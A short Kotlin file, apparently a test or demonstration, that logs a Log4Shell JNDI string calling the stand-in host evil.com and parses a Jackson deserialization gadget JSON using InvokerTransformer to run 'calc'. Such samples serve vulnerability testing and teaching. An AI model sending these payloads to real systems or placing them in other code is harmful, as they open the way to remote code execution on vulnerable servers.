import org.apache.logging.log4j.LogManager
import com.fasterxml.jackson.databind.ObjectMapper

fun main() {
    val logger = LogManager.getLogger("TestLogger")
    val userInput = "\${jndi:ldap://evil.com/a}" // Simule un payload Log4Shell
    logger.error("Received input: $userInput")

    val mapper = ObjectMapper()
    val maliciousJson = """{
        "@type": "org.apache.commons.collections.functors.InvokerTransformer",
        "iMethodName":"exec",
        "iParamTypes":["java.lang.String"],
        "iArgs":["calc"]
    }"""
    val obj = mapper.readValue(maliciousJson, Any::class.java)
    println("Parsed object: $obj")
}
